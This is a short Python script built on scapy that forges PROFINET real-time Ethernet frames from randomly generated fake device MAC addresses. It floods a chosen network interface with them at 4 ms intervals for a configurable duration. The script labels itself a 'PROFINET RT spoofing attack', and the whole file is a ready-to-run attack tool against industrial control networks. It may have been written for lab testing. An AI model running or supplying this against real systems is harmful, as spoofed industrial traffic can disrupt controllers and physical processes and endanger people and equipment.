import argparse
import random
import struct
import time
from scapy.all import Ether, conf


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0,255), random.randint(0,255), 
        random.randint(0,255), random.randint(0,255), random.randint(0,255)
        )
    


def build_spoofed_frame(src_mac, frame_id, cycle_counter):
    header = struct.pack(">HHBB", frame_id, cycle_counter, 0x35, 0x00)
    payload = header + bytes(40)
    return Ether(src = src_mac, dst = "01:0e:cf:00:00:00", type = 0x8892) / payload
    


def spoof_attack(iface, duration_s, num_fake_devices, cycle_ms=4.0):
    fake_mac = [random_mac() for _ in range(num_fake_devices)]
    print(f"Simulating {num_fake_devices} fake devices:")
    for m in fake_mac:
        print(f" {m}")
        
    
    l2_socket = conf.L2socket(iface=iface)
    cycle_counters = {mac: 0 for mac in fake_mac}
    frame_sent = 0
    start = time.perf_counter()
    
    try:
        while time.perf_counter() - start < duration_s:
            mac = random.choice(fake_mac)
            frame = build_spoofed_frame(mac, 0x8001, cycle_counters[mac])
            l2_socket.send(frame)
            cycle_counters[mac] = (cycle_counters[mac] + 1) % 65536
            frame_sent +=1
            time.sleep(cycle_ms/1000)
            
    finally:
        l2_socket.close()
    
    print(f"Spoof attack completed successfully. {frame_sent} number of frames sent from {num_fake_devices} fake devices")


def parse_args():
    p = argparse.ArgumentParser(description = "PROFINET RT spoofing attack")
    p.add_argument("--iface", default = "eth0"),
    p.add_argument("--duration", default = 300, type = int)
    p.add_argument("--fake-devices", default = 5, type = int)
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    spoof_attack(args.iface, args.duration, args.fake_devices)
